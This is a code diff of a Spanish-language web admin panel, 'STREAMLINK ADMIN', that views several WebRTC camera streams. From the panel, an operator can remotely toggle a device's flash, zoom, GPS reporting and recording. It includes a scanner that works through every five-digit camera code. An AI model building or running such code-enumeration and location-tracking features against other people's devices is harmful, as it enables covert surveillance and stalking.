@@ -109,7 +109,8 @@ body::before{content:'';position:fixed;inset:0;
 .scan-auto-btn.scanning{border-color:#f59e0b50;color:var(--yellow);animation:pulse 1.5s infinite}
 .scan-dot{width:6px;height:6px;border-radius:50%;background:currentColor;}
 .scan-progress{height:2px;background:var(--s2);position:relative;overflow:hidden;margin-top:6px;border-radius:999px;}
-.scan-progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),var(--cyan));border-radius:999px;transition:width .3s;width:0%;}
+.scan-progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),var(--cyan));border-radius:999px;transition:width .4s;width:0%;}
+.scan-stats{font-family:'JetBrains Mono',monospace;font-size:.52rem;color:var(--text3);margin-top:4px;text-align:center;}
 
 /* ── MAIN ── */
 .main-content{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0;}
@@ -222,9 +223,9 @@ body::before{content:'';position:fixed;inset:0;
 
 /* Cmd ack flash */
 .ctrl-btn.cmd-ok{animation:cmdok .6s ease-out}
-@keyframes cmdok{0%{background:rgba(16,185,129,.3)}100%{background:var(--s2)}}
+@keyframes cmdok{0%{background:rgba(16,185,129,.4)}100%{background:var(--s2)}}
 .ctrl-btn.cmd-err{animation:cmderr .6s ease-out}
-@keyframes cmderr{0%{background:rgba(239,68,68,.3)}100%{background:var(--s2)}}
+@keyframes cmderr{0%{background:rgba(239,68,68,.4)}100%{background:var(--s2)}}
 
 .slider-mini{flex:1;height:2px;background:var(--s3);border-radius:999px;outline:none;-webkit-appearance:none;cursor:pointer;}
 .slider-mini::-webkit-slider-thumb{-webkit-appearance:none;width:12px;height:12px;background:var(--accent2);border-radius:50%;cursor:pointer;}
@@ -308,6 +309,7 @@ body::before{content:'';position:fixed;inset:0;
         <span id="scanBtnLabel">Escanear rango (00000–99999)</span>
       </button>
       <div class="scan-progress"><div class="scan-progress-bar" id="scanProgressBar"></div></div>
+      <div class="scan-stats" id="scanStats"></div>
     </div>
   </div>
 
@@ -382,29 +384,22 @@ body::before{content:'';position:fixed;inset:0;
       <div id="controlsContent">
         <div class="no-selection">Sin cámara activa</div>
       </div>
-
       <div id="controlsActive" style="display:none">
 
-        <!-- Fila 1: Voltear + Flash + Mirror -->
+        <!-- Fila 1: Voltear + Flash + GPS -->
         <div class="ctrl-row-3" style="margin-bottom:6px">
-
-          <!-- Voltear cámara (comando remoto) -->
           <button class="ctrl-btn" id="ctrl-remote-flip">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <path d="M7 16V4m0 0L3 8m4-4l4 4"/><path d="M17 8v12m0 0l4-4m-4 4l-4-4"/>
             </svg>
             Voltear
           </button>
-
-          <!-- Flash (comando remoto) -->
           <button class="ctrl-btn" id="ctrl-remote-torch">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
             </svg>
             Flash
           </button>
-
-          <!-- GPS toggle (comando remoto) -->
           <button class="ctrl-btn" id="ctrl-remote-gps">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
               <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/>
@@ -413,7 +408,7 @@ body::before{content:'';position:fixed;inset:0;
           </button>
         </div>
 
-        <!-- Fila 2: Snapshot + Fullscreen local + PiP -->
+        <!-- Fila 2: Snapshot + PiP -->
         <div class="ctrl-row">
           <button class="ctrl-btn" id="ctrl-snap">
             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg>
@@ -425,7 +420,7 @@ body::before{content:'';position:fixed;inset:0;
           </button>
         </div>
 
-        <!-- Grabación (guarda en la cámara) -->
+        <!-- Grabación -->
         <button class="ctrl-btn-full" id="ctrl-rec">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
             <circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/>
@@ -433,21 +428,21 @@ body::before{content:'';position:fixed;inset:0;
           Iniciar Grabación (en cámara)
         </button>
 
-        <!-- VOL (local en admin) -->
+        <!-- Volumen local -->
         <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px">
           <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--text3);width:28px">VOL</span>
           <input type="range" class="slider-mini" id="ctrl-vol" min="0" max="1" step="0.05" value="1">
           <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent2);width:32px;text-align:right" id="ctrl-vol-val">100%</span>
         </div>
 
-        <!-- ZOOM (comando remoto) -->
+        <!-- Zoom remoto -->
         <div style="display:flex;align-items:center;gap:8px;margin-bottom:5px">
           <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--text3);width:28px">ZOOM</span>
           <input type="range" class="slider-mini" id="ctrl-zoom" min="1" max="8" step="0.1" value="1">
           <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--accent2);width:32px;text-align:right" id="ctrl-zoom-val">1×</span>
         </div>
 
-        <!-- BRILLO (comando remoto) -->
+        <!-- Brillo remoto -->
         <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
           <span style="font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--text3);width:28px">LUZ</span>
           <input type="range" class="slider-mini" id="ctrl-bri" min="0.5" max="2" step="0.05" value="1">
@@ -507,28 +502,19 @@ body::before{content:'';position:fixed;inset:0;
 <script>
 // ════════════════════════════════════════════
 //  STREAMLINK ADMIN — Multi-camera viewer
-//  + Remote camera control (flip, torch, zoom, brightness, GPS, record)
+//  v2.0 — Scanner optimizado + bugs corregidos
 // ════════════════════════════════════════════
 
-// ── STATE ──
-let adminPeer = null;
-let cameras   = {};     // id → camState
-let selectedId = null;
+// ── ESTADO GLOBAL ──
+let adminPeer   = null;
+let cameras     = {};       // id → camState
+let selectedId  = null;
 let currentLayout = 1;
-let isScanning = false;
-let scanAbort  = false;
+let isScanning  = false;
+let scanAbort   = false;
 
-// camState = {
-//   id, name, call, dataConn, stream,
-//   status, gps, deviceInfo, stats,
-//   torchState, gpsActive, isRecording,
-//   isMuted, volume, brightness, zoom,
-//   prevBytes, viewerStartTime,
-//   statsInterval, viewTimerInterval
-// }
-
-// ── UTILS ──
-function toast(msg, type='info', dur=3000) {
+// ── UTILIDADES ──
+function toast(msg, type = 'info', dur = 3000) {
   const el = document.getElementById('toast');
   el.textContent = msg;
   el.className = 'toast show ' + type;
@@ -536,11 +522,14 @@ function toast(msg, type='info', dur=3000) {
   el._t = setTimeout(() => { el.className = 'toast'; }, dur);
 }
 function fmtTime(sec) {
-  return Math.floor(sec/60).toString().padStart(2,'0')+':'+(sec%60).toString().padStart(2,'0');
+  const m = Math.floor(sec / 60).toString().padStart(2, '0');
+  const s = (sec % 60).toString().padStart(2, '0');
+  return `${m}:${s}`;
 }
 function setStatus(text, cls) {
   const el = document.getElementById('statusBadge');
-  el.textContent = text; el.className = 'badge ' + cls;
+  el.textContent = text;
+  el.className = 'badge ' + cls;
 }
 function updateTopStats() {
   const total = Object.keys(cameras).length;
@@ -549,91 +538,118 @@ function updateTopStats() {
   document.getElementById('ts-live').textContent  = live;
   document.getElementById('camCountLabel').textContent =
     total === 0 ? 'Sin cámaras activas' : `${live}/${total} en vivo`;
-  if (live === 0 && total === 0) setStatus('OFFLINE', 'badge-idle');
-  else if (live > 0) setStatus(`EN VIVO · ${live}`, 'badge-live');
-  else setStatus('MONITOREANDO', 'badge-scan');
+  if (total === 0 && !isScanning) setStatus('OFFLINE', 'badge-idle');
+  else if (live > 0)              setStatus(`EN VIVO · ${live}`, 'badge-live');
+  else if (isScanning)            setStatus('ESCANEANDO...', 'badge-scan');
+  else                            setStatus('MONITOREANDO', 'badge-scan');
 }
 
-// ── SEND COMMAND TO CAMERA ──
+// ── ENVIAR COMANDO A CÁMARA ──
 function sendCamCommand(camId, action, value) {
   const cam = cameras[camId];
-  if (!cam || !cam.dataConn) return false;
-  if (cam.dataConn.readyState !== 'open') {
-    toast('Canal de datos no disponible', 'error'); return false;
-  }
+  if (!cam || !cam.dataConn) { toast('Canal de datos no disponible', 'error'); return false; }
+  if (cam.dataConn.readyState !== 'open') { toast('Canal de datos no está abierto', 'error'); return false; }
   const msg = { type: 'cmd', action };
   if (value !== undefined) msg.value = value;
-  try { cam.dataConn.send(JSON.stringify(msg)); return true; }
-  catch(e) { toast('Error al enviar comando', 'error'); return false; }
+  try {
+    cam.dataConn.send(JSON.stringify(msg));
+    return true;
+  } catch (e) {
+    toast('Error al enviar comando', 'error');
+    return false;
+  }
 }
 
-// ── PEER INIT ──
+// ── INICIALIZAR PEER ADMIN ──
 function initAdminPeer(cb) {
-  if (adminPeer && !adminPeer.destroyed) { if(cb) cb(); return; }
+  if (adminPeer && !adminPeer.destroyed) {
+    if (adminPeer.open) { if (cb) cb(); return; }
+    adminPeer.on('open', () => { if (cb) cb(); });
+    return;
+  }
   adminPeer = new Peer({
-    config: { iceServers: [
-      {urls:'stun:stun.l.google.com:19302'},
-      {urls:'stun:stun1.l.google.com:19302'},
-    ]},
+    config: {
+      iceServers: [
+        { urls: 'stun:stun.l.google.com:19302' },
+        { urls: 'stun:stun1.l.google.com:19302' },
+        { urls: 'stun:stun2.l.google.com:19302' },
+      ]
+    },
     debug: 0
   });
-  adminPeer.on('open', () => { if(cb) cb(); });
-  adminPeer.on('error', () => {});
+  adminPeer.on('open', () => {
+    setStatus('LISTO', 'badge-live');
+    if (cb) cb();
+  });
+  adminPeer.on('error', (err) => {
+    // Ignorar errores de peer-not-found durante el escaneo
+    if (err.type === 'peer-unavailable') return;
+    console.warn('PeerJS error:', err.type);
+  });
 }
 
-// ── CONNECT TO CAMERA ──
+// ── CONECTAR CÁMARA ──
 function connectCamera(camId) {
-  camId = camId.trim();
+  camId = String(camId).trim();
   if (!camId || camId.length !== 5 || !/^\d+$/.test(camId)) {
     toast('Código inválido (5 dígitos)', 'error'); return;
   }
   if (cameras[camId]) {
     toast('Cámara ya conectada', 'info'); selectCamera(camId); return;
   }
+
   cameras[camId] = {
     id: camId, name: `Cam ${camId}`, status: 'connecting',
     call: null, dataConn: null, stream: null,
     gps: null, deviceInfo: null,
-    stats: {lat:'—',bit:'—',pkt:'—',q:'—',res:'—'},
-    prevBytes: 0, isMuted: false, volume: 1, brightness: 1, zoom: 1,
+    stats: { lat: '—', bit: '—', pkt: '—', q: '—', res: '—', time: '—' },
+    prevBytes: 0, volume: 1, brightness: 1, zoom: 1,
     torchState: false, gpsActive: false, isRecording: false,
     viewerStartTime: Date.now(), statsInterval: null, viewTimerInterval: null
   };
   renderCamList(); renderGrid(); updateTopStats();
 
   initAdminPeer(() => {
-    // Data channel (admin → cam commands, cam → admin events)
+    // Canal de datos para comandos y eventos
     const dc = adminPeer.connect(camId, { reliable: true, label: 'data' });
-    dc.on('open', () => { cameras[camId].dataConn = dc; });
+    dc.on('open', () => {
+      if (!cameras[camId]) return;
+      cameras[camId].dataConn = dc;
+    });
     dc.on('data', raw => {
       try {
         const msg = typeof raw === 'string' ? JSON.parse(raw) : raw;
-        if (msg.type === 'gps')        handleGps(camId, msg);
+        if      (msg.type === 'gps')        handleGps(camId, msg);
         else if (msg.type === 'deviceInfo') handleDeviceInfo(camId, msg);
         else if (msg.type === 'cmdAck')     handleCmdAck(camId, msg);
-      } catch(e) {}
+      } catch (e) { /* malformed message */ }
     });
+    dc.on('error', () => {});
+    dc.on('close', () => {});
 
-    // Dummy stream to initiate the call
+    // Stream vacío para iniciar la llamada (el stream real viene de la cámara)
     let emptyStream;
     try {
-      const ac = new AudioContext();
-      const dest = ac.createMediaStreamDestination();
       const canvas = document.createElement('canvas');
       canvas.width = 2; canvas.height = 2;
+      const ac  = new AudioContext();
+      const dst = ac.createMediaStreamDestination();
       emptyStream = new MediaStream([
-        dest.stream.getAudioTracks()[0],
-        canvas.captureStream(1).getVideoTracks()[0]
+        canvas.captureStream(1).getVideoTracks()[0],
+        dst.stream.getAudioTracks()[0]
       ]);
-    } catch { emptyStream = new MediaStream(); }
+    } catch (e) {
+      emptyStream = new MediaStream();
+    }
 
     const call = adminPeer.call(camId, emptyStream);
-    if (!call) { removeCam(camId, 'No se pudo conectar'); return; }
+    if (!call) { removeCam(camId, null); return; }
     cameras[camId].call = call;
 
+    // Timeout si no responde en 12s
     const timeout = setTimeout(() => {
       if (cameras[camId] && cameras[camId].status === 'connecting') removeCam(camId, null);
-    }, 10000);
+    }, 12000);
 
     call.on('stream', stream => {
       clearTimeout(timeout);
@@ -644,8 +660,10 @@ function connectCamera(camId) {
       attachStream(camId, stream);
       startCamStats(camId, call);
       startViewTimer(camId);
-      renderCamList(); renderGrid(); updateTopStats();
-      toast(`Cámara ${camId} conectada`, 'success');
+      renderCamList();
+      renderGrid();
+      updateTopStats();
+      toast(`✓ Cámara ${camId} conectada`, 'success');
       if (!selectedId) selectCamera(camId);
     });
     call.on('close', () => { clearTimeout(timeout); handleCamClose(camId); });
@@ -657,7 +675,8 @@ function handleCamClose(camId) {
   if (!cameras[camId]) return;
   cameras[camId].status = 'offline';
   cameras[camId].stream = null;
-  stopCamStats(camId); stopViewTimer(camId);
+  stopCamStats(camId);
+  stopViewTimer(camId);
   renderCamList(); renderGrid(); updateTopStats();
   if (selectedId === camId) renderDetailPanel();
 }
@@ -665,42 +684,75 @@ function handleCamClose(camId) {
 function removeCam(camId, msg) {
   if (!cameras[camId]) return;
   const cam = cameras[camId];
-  if (cam.call)     try { cam.call.close(); } catch(e) {}
-  if (cam.dataConn) try { cam.dataConn.close(); } catch(e) {}
-  stopCamStats(camId); stopViewTimer(camId);
+  if (cam.call)     try { cam.call.close(); }     catch (e) {}
+  if (cam.dataConn) try { cam.dataConn.close(); } catch (e) {}
+  stopCamStats(camId);
+  stopViewTimer(camId);
   delete cameras[camId];
-  if (selectedId === camId) selectedId = null;
+  if (selectedId === camId) { selectedId = null; }
   renderCamList(); renderGrid(); updateTopStats(); renderDetailPanel();
   if (msg) toast(msg, 'error');
 }
 
-// ── CMD ACK ──
+// ── COMMAND ACK ──
 function handleCmdAck(camId, msg) {
   if (!cameras[camId]) return;
+  const cam = cameras[camId];
+
   if (msg.error) {
     toast(`${msg.action}: ${msg.error}`, 'warn');
+    // Flash rojo en botón si corresponde
+    const btnMap = {
+      flip: 'ctrl-remote-flip', torch: 'ctrl-remote-torch', gps_start: 'ctrl-remote-gps',
+      gps_stop: 'ctrl-remote-gps', zoom: null, brightness: null,
+    };
+    const btnId = btnMap[msg.action];
+    if (btnId) {
+      const btn = document.getElementById(btnId);
+      if (btn) { btn.classList.add('cmd-err'); setTimeout(() => btn.classList.remove('cmd-err'), 700); }
+    }
     return;
   }
-  // Update local state based on ack
+
+  // Actualizar estado local desde ack
   if (msg.action === 'torch') {
-    cameras[camId].torchState = !!msg.value;
+    cam.torchState = !!msg.value;
     if (selectedId === camId) updateRemoteControlUI(camId);
+    // Flash verde en botón torch
+    const btn = document.getElementById('ctrl-remote-torch');
+    if (btn) { btn.classList.add('cmd-ok'); setTimeout(() => btn.classList.remove('cmd-ok'), 700); }
   }
   if (msg.action === 'flip') {
-    // facingMode updated on cam side — just ack here
+    const btn = document.getElementById('ctrl-remote-flip');
+    if (btn) { btn.classList.add('cmd-ok'); setTimeout(() => btn.classList.remove('cmd-ok'), 700); }
   }
   if (msg.action === 'gps_start') {
-    cameras[camId].gpsActive = !!msg.active;
+    cam.gpsActive = !!msg.active;
+    if (selectedId === camId) updateRemoteControlUI(camId);
+  }
+  if (msg.action === 'gps_stop') {
+    cam.gpsActive = false;
+    cam.gps = null;
+    if (selectedId === camId) { updateRemoteControlUI(camId); renderGpsPanel(); }
+  }
+  if (msg.action === 'record_start') {
+    cam.isRecording = true;
+    if (selectedId === camId) updateRemoteControlUI(camId);
+  }
+  if (msg.action === 'record_stop') {
+    cam.isRecording = false;
     if (selectedId === camId) updateRemoteControlUI(camId);
   }
 }
 
-// ── STREAM ATTACH ──
+// ── ATTACH STREAM ──
 function attachStream(camId, stream) {
+  // Grid view
   const gv = document.getElementById(`gvid-${camId}`);
-  if (gv) { gv.srcObject = stream; gv.play().catch(()=>{}); }
+  if (gv) { gv.srcObject = stream; gv.muted = false; gv.volume = cameras[camId]?.volume ?? 1; gv.play().catch(() => {}); }
+  // Thumbnail list
   const tv = document.getElementById(`tvid-${camId}`);
-  if (tv) { tv.srcObject = stream; tv.play().catch(()=>{}); }
+  if (tv) { tv.srcObject = stream; tv.play().catch(() => {}); }
 }
 
 // ── GPS + DEVICE INFO ──
@@ -716,10 +768,10 @@ function handleDeviceInfo(camId, d) {
   if (selectedId === camId) renderDevicePanel();
 }
 
-// ── STATS ──
+// ── ESTADÍSTICAS ──
 function startCamStats(camId, call) {
   stopCamStats(camId);
-  const pc = call.peerConnection;
+  const pc = call?.peerConnection;
   if (!pc) return;
   cameras[camId].statsInterval = setInterval(async () => {
     if (!cameras[camId]) return;
@@ -728,43 +780,46 @@ function startCamStats(camId, call) {
       reports.forEach(r => {
         if (r.type === 'inbound-rtp' && r.kind === 'video') {
           const bytes = r.bytesReceived || 0;
-          const diff  = bytes - cameras[camId].prevBytes;
-          cameras[camId].prevBytes = bytes;
+          const diff  = bytes - (cameras[camId]?.prevBytes || 0);
+          if (cameras[camId]) cameras[camId].prevBytes = bytes;
           const kbps = Math.round((diff * 8) / 1024);
-          cameras[camId].stats.bit = kbps > 0 ? kbps + ' kbps' : '—';
-          const lost = r.packetsLost || 0;
-          const tot  = (r.packetsReceived || 0) + lost;
-          const lr   = tot > 0 ? ((lost/tot)*100).toFixed(1) : '0.0';
-          cameras[camId].stats.pkt = lr + '%';
-          if (r.frameWidth) cameras[camId].stats.res = `${r.frameWidth}×${r.frameHeight}`;
-          const q = parseFloat(lr)<1 && kbps>200 ? 'Excelente' : parseFloat(lr)<5 ? 'Buena' : 'Baja';
-          cameras[camId].stats.q = q;
+          if (cameras[camId]) {
+            cameras[camId].stats.bit = kbps > 0 ? kbps + ' kbps' : '—';
+            const lost = r.packetsLost || 0;
+            const tot  = (r.packetsReceived || 0) + lost;
+            const lr   = tot > 0 ? ((lost / tot) * 100).toFixed(1) : '0.0';
+            cameras[camId].stats.pkt = lr + '%';
+            if (r.frameWidth) cameras[camId].stats.res = `${r.frameWidth}×${r.frameHeight}`;
+            cameras[camId].stats.q = parseFloat(lr) < 1 && kbps > 200 ? 'Excelente'
+              : parseFloat(lr) < 5 ? 'Buena' : 'Baja';
+          }
         }
         if (r.type === 'candidate-pair' && r.state === 'succeeded') {
           const rtt = r.currentRoundTripTime;
-          if (rtt !== undefined) {
+          if (rtt !== undefined && cameras[camId]) {
             const ms = Math.round(rtt * 1000);
             cameras[camId].stats.lat = ms + ' ms';
             document.getElementById('ts-lat').textContent = ms + ' ms';
           }
         }
       });
-    } catch(e) {}
+    } catch (e) {}
     updateCellStats(camId);
     if (selectedId === camId) updateDetailStats();
   }, 2000);
 }
 function stopCamStats(camId) {
-  if (cameras[camId] && cameras[camId].statsInterval) {
+  if (cameras[camId]?.statsInterval) {
     clearInterval(cameras[camId].statsInterval);
     cameras[camId].statsInterval = null;
   }
 }
 function startViewTimer(camId) {
   stopViewTimer(camId);
+  if (!cameras[camId]) return;
   cameras[camId].viewTimerInterval = setInterval(() => {
     if (!cameras[camId]) return;
-    const sec = Math.floor((Date.now() - cameras[camId].viewerStartTime)/1000);
+    const sec = Math.floor((Date.now() - cameras[camId].viewerStartTime) / 1000);
     cameras[camId].stats.time = fmtTime(sec);
     if (selectedId === camId) {
       const el = document.getElementById('d-time');
@@ -773,20 +828,19 @@ function startViewTimer(camId) {
   }, 1000);
 }
 function stopViewTimer(camId) {
-  if (cameras[camId] && cameras[camId].viewTimerInterval) {
+  if (cameras[camId]?.viewTimerInterval) {
     clearInterval(cameras[camId].viewTimerInterval);
     cameras[camId].viewTimerInterval = null;
   }
 }
 
-// ── CAMERA LIST ──
+// ── LISTA DE CÁMARAS ──
 function renderCamList() {
   const list = document.getElementById('camList');
   const ids  = Object.keys(cameras);
   if (ids.length === 0) {
     list.innerHTML = `<div style="font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3);text-align:center;padding:20px 8px;">
-      Usá el escáner o añadí un código de cámara manualmente.
-    </div>`;
+      Usá el escáner o añadí un código de cámara manualmente.</div>`;
     return;
   }
   list.innerHTML = '';
@@ -797,7 +851,7 @@ function renderCamList() {
     el.className = 'cam-item' + (isActive ? ' active' : '');
     el.id = `ci-${id}`;
     const dotClass = cam.status === 'live' ? 'live' : cam.status === 'connecting' ? 'connecting' : 'offline';
-    const statusText = cam.status === 'live' ? 'EN VIVO' : cam.status === 'connecting' ? 'Conectando…' : 'Desconectado';
+    const statusTxt = cam.status === 'live' ? 'EN VIVO' : cam.status === 'connecting' ? 'Conectando…' : 'Desconectado';
     el.innerHTML = `
       <div class="cam-item-header">
         <div class="cam-dot ${dotClass}"></div>
@@ -807,44 +861,48 @@ function renderCamList() {
       <div class="cam-thumb">
         ${cam.status === 'live'
           ? `<video id="tvid-${id}" autoplay playsinline muted style="width:100%;height:100%;object-fit:cover;"></video>`
-          : `<div class="cam-thumb-overlay">${statusText}</div>`
-        }
+          : `<div class="cam-thumb-overlay">${statusTxt}</div>`}
       </div>
       <div class="cam-item-footer">
         <div class="cam-footer-stat">ID: <span>${id}</span></div>
-        ${cam.torchState ? '<div class="cam-footer-stat" style="margin-left:auto;color:var(--yellow)">⚡ FLASH</div>' : ''}
-        ${cam.gps ? '<div class="cam-footer-stat" style="margin-left:auto;color:var(--green)">📍 GPS</div>' : ''}
-      </div>
-    `;
+        ${cam.torchState  ? '<div class="cam-footer-stat" style="margin-left:auto;color:var(--yellow)">⚡</div>' : ''}
+        ${cam.gps         ? '<div class="cam-footer-stat" style="color:var(--green)">📍</div>' : ''}
+      </div>`;
     el.addEventListener('click', () => selectCamera(id));
     list.appendChild(el);
     if (cam.status === 'live' && cam.stream) {
       const tv = document.getElementById(`tvid-${id}`);
-      if (tv) { tv.srcObject = cam.stream; tv.play().catch(()=>{}); }
+      if (tv) { tv.srcObject = cam.stream; tv.play().catch(() => {}); }
     }
   });
 }
 
 // ── GRID ──
 function renderGrid() {
-  const grid      = document.getElementById('camGrid');
-  const emptyState= document.getElementById('emptyState');
+  const grid       = document.getElementById('camGrid');
+  const emptyState = document.getElementById('emptyState');
   const ids = Object.keys(cameras);
+
   if (ids.length === 0) {
     grid.style.display = 'none'; emptyState.style.display = 'flex'; return;
   }
   emptyState.style.display = 'none';
   grid.style.display = 'grid';
   grid.innerHTML = '';
+
   ids.forEach(id => {
-    const cam = cameras[id];
+    const cam  = cameras[id];
     const cell = document.createElement('div');
     cell.className = 'cam-cell' + (selectedId === id ? ' selected' : '');
     cell.id = `cell-${id}`;
+
     if (cam.status === 'live') {
-      const gpsText = cam.gps ? `📍 ${(+cam.gps.lat).toFixed(5)}, ${(+cam.gps.lng).toFixed(5)} ±${cam.gps.acc != null ? (+cam.gps.acc).toFixed(0) : '?'}m` : '';
+      const gpsText = cam.gps
+        ? `📍 ${(+cam.gps.lat).toFixed(5)}, ${(+cam.gps.lng).toFixed(5)} ±${cam.gps.acc != null ? (+cam.gps.acc).toFixed(0) : '?'}m`
+        : '';
       cell.innerHTML = `
-        <video id="gvid-${id}" autoplay playsinline style="width:100%;height:100%;object-fit:contain;filter:brightness(${cam.brightness||1})"></video>
+        <video id="gvid-${id}" autoplay playsinline
+          style="width:100%;height:100%;object-fit:contain;filter:brightness(${cam.brightness || 1})"></video>
         <div class="cell-hud-top">
           <div class="cell-live-badge">● LIVE</div>
           <div class="cell-cam-name">${cam.name}${cam.torchState ? ' ⚡' : ''}</div>
@@ -853,43 +911,68 @@ function renderGrid() {
           <div>
             ${gpsText ? `<div class="cell-gps-badge">${gpsText}</div>` : ''}
             <div class="cell-stats-row" style="margin-top:3px">
-              <div class="cell-stat">${cam.stats.lat||'—'}</div>
-              <div class="cell-stat">${cam.stats.bit||'—'}</div>
-              <div class="cell-stat">${cam.stats.res||'—'}</div>
+              <div class="cell-stat">${cam.stats.lat || '—'}</div>
+              <div class="cell-stat">${cam.stats.bit || '—'}</div>
+              <div class="cell-stat">${cam.stats.res || '—'}</div>
             </div>
           </div>
           <div class="cell-actions">
             <button class="cell-action-btn" onclick="snapCell('${id}',event)" title="Captura">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/>
+                <circle cx="12" cy="13" r="4"/>
+              </svg>
             </button>
             <button class="cell-action-btn" onclick="focusCell('${id}',event)" title="Focus">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/></svg>
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/>
+              </svg>
             </button>
-            <button class="cell-action-btn" onclick="removeCam('${id}','Cámara desconectada');event.stopPropagation()" title="Desconectar" style="color:#ef4444">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            <button class="cell-action-btn" onclick="removeCam('${id}','Cámara ${id} desconectada');event.stopPropagation()"
+              title="Desconectar" style="color:#ef4444">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
+              </svg>
             </button>
           </div>
-        </div>
-      `;
+        </div>`;
     } else if (cam.status === 'connecting') {
-      cell.innerHTML = `<div class="cam-cell-overlay"><div class="cell-connecting" style="display:flex;flex-direction:column;align-items:center;gap:8px"><div class="mini-spinner"></div><div class="mini-spinner-txt">Conectando ${id}…</div></div></div>`;
+      cell.innerHTML = `<div class="cam-cell-overlay">
+        <div style="display:flex;flex-direction:column;align-items:center;gap:8px">
+          <div class="mini-spinner"></div>
+          <div class="mini-spinner-txt">Conectando ${id}…</div>
+        </div></div>`;
     } else {
-      cell.innerHTML = `<div class="cam-cell-overlay"><div class="mini-spinner-txt" style="color:var(--red)">Desconectado</div><div class="mini-spinner-txt">${id}</div></div>`;
+      cell.innerHTML = `<div class="cam-cell-overlay">
+        <div class="mini-spinner-txt" style="color:var(--red)">Desconectado</div>
+        <div class="mini-spinner-txt">${id}</div></div>`;
     }
-    cell.addEventListener('click', e => { if (!e.target.closest('.cell-action-btn')) selectCamera(id); });
+
+    cell.addEventListener('click', e => {
+      if (!e.target.closest('.cell-action-btn')) selectCamera(id);
+    });
     grid.appendChild(cell);
+
     if (cam.status === 'live' && cam.stream) {
       const gv = document.getElementById(`gvid-${id}`);
-      if (gv) { gv.srcObject = cam.stream; gv.muted = cam.isMuted; gv.volume = cam.volume||1; gv.play().catch(()=>{}); }
+      if (gv) {
+        gv.srcObject = cam.stream;
+        gv.muted  = false;
+        gv.volume = cam.volume || 1;
+        gv.play().catch(() => {});
+      }
     }
   });
-  // Fill empty cells for fixed layouts
-  if (currentLayout > 1 && currentLayout !== 'auto') {
+
+  // Celdas vacías para layouts fijos
+  if (typeof currentLayout === 'number' && currentLayout > 1) {
     const needed = currentLayout - ids.length;
-    for (let i = 0; i < needed; i++) {
+    for (let i = 0; i < needed && i < currentLayout; i++) {
       const empty = document.createElement('div');
       empty.className = 'cam-cell-empty';
-      empty.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1"><path d="M15 10l4.553-2.069A1 1 0 0121 8.82v6.36a1 1 0 01-1.447.89L15 14M3 8a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/></svg>`;
+      empty.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
+        <path d="M15 10l4.553-2.069A1 1 0 0121 8.82v6.36a1 1 0 01-1.447.89L15 14M3 8a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/>
+      </svg>`;
       grid.appendChild(empty);
     }
   }
@@ -905,66 +988,73 @@ function updateCellStats(camId) {
     chips[2].textContent = cameras[camId].stats.res || '—';
   }
 }
+
 function updateCellGps(camId) {
+  const cam = cameras[camId];
+  if (!cam || cam.status !== 'live') return;
   const cell = document.getElementById(`cell-${camId}`);
-  if (!cell || !cameras[camId] || cameras[camId].status !== 'live') return;
+  if (!cell) return;
   const badge = cell.querySelector('.cell-gps-badge');
-  const gps = cameras[camId].gps;
-  if (gps && badge) {
-    badge.textContent = `📍 ${(+gps.lat).toFixed(5)}, ${(+gps.lng).toFixed(5)} ±${gps.acc != null ? (+gps.acc).toFixed(0) : '?'}m`;
-  } else if (gps && !badge) { renderGrid(); }
